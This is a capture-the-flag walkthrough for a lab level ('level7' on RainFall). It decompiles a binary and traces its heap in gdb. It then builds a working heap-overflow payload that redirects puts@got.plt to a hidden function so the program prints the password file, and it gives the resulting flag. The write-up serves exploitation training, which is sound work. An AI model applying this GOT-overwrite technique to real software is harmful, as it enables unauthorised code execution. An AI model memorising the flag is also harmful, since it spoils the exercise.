## Flag7 README: Finding Flag7

Decompile

``` C
int m()
{
  time_t v0; // eax

  v0 = time(0);
  return printf("%s - %d\n", c, v0);
}

//----- (08048521) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax
  void *v5; // [esp+18h] [ebp-8h]
  void *v6; // [esp+1Ch] [ebp-4h]

  v6 = malloc(8u);
  *(_DWORD *)v6 = 1;
  *((_DWORD *)v6 + 1) = malloc(8u);
  v5 = malloc(8u);
  *(_DWORD *)v5 = 2;
  *((_DWORD *)v5 + 1) = malloc(8u);
  strcpy(*((char **)v6 + 1), argv[1]);
  strcpy(*((char **)v5 + 1), argv[2]);
  v3 = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, v3);
  puts("~~");
  return 0;
}
```
So the idea is how can we read c. And we can see there is some dead code with the function m that read c. What we are going to do is do a got with the puts function. So first what we have to do is search for the heap allocation.

let's see with this test :
run AAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBB
heap :
(gdb) x/64wx 0x804a018 - 16
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x41414141	0x41414141	0x00414141
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a048:	0x00424242	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	0x00000000	0x00000000	0x00000000	0x00000000

0x804a008:	0x00000001
this is   *(_DWORD *)v6 = 1;
and this 0x0804a018 is the adress of the heap allocation *((_DWORD *)v6 + 1) = malloc(8u);
We can see that there is the adress 0x00000002 is the   *(_DWORD *)v5 = 2; in our code.
this is our ptr 0x0804a038 to the buffer *((_DWORD *)v5 + 1) = malloc(8u);

(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>




(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406

Let's try to overide this adress 0x0804a038 with the adress of our function got (\x28\x99\x04\x08)

(gdb) run $(python -c 'print("\x90" * 20 + "\x28\x99\x04\x08" + " " + "BBBBBBBBBBBBB")')

(gdb) x/64wx 0x804a018 - 16
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a028:	0x90909090	0x08049928	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000


and we can see that now at the adress of our got we have our b :
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x42424242

so what we just have to do is to add the adress of m function and the payload will be
python -c 'print("\x90" * 20 + "\x28\x99\x04\x08" + " " + "\xf4\x84\x04\x08")'
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

level7@RainFall:~$ ./level7 `python -c 'print("\x90" * 20 + "\x28\x99\x04\x08" + " " + "\xf4\x84\x04\x08")'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
